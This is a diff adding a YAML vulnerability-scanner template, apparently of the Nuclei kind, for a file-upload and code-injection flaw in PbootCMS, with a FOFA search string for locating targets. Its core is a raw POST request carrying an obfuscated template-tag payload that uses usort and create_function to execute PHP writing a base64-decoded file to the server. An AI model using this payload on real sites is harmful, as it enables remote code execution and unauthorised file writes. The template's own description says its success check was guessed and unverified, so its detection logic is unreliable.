@@ -1,0 +1,44 @@
+id: poc-572bf6566425f82e42c2
+info:
+  name: PbootCMSpboot存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/572bf6566425f82e42c2f22d0724f6ce
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 572bf6566425f82e42c2f22d0724f6ce
+    fofa: + fofa`app="PBOOTCMS"`
+http:
+- raw:
+  - 'POST /?tag/index=&tag={pbohome/Indexot:if(1)(usort/*%3e*/(post/*%3e*/(/*%3e*/1),create_function/*%3e*/(/*%3e*/post/*%3e*/(/*%3e*/2),post/*%3e*/(/*%3e*/3))));//)}(123){/pbhome/Indexoot:if}&tagstpl=news.html&lnoc2tspfar1_ue HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Accept: */*
+
+    Accept-Language: en-US;q=0.9,en;q=0.8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
+
+    Connection: close
+
+    Cookie: lg=call_user_func
+
+    Cache-Control: max-age=0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 97
+
+
+    1[]=ayaq.txt&1[]=YXk=&2=$a,$b&3=return var_dump(file_put_contents($b,base64_decode($a)));'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
